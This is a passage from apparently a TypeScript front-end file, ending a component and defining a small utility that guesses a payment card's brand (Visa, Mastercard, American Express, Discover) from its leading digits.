  );
}

// Utility
function detectCardBrand(num: string) {
  const n = num.replace(/\s/g, "");
  if (/^4/.test(n)) return "Visa";
  if (/^5[1-5]/.test(n)) return "Mastercard";
  if (/^3[47]/.test(n)) return "American Express";
  if (/^6/.test(n)) return "Discover";
  return "Card";
}
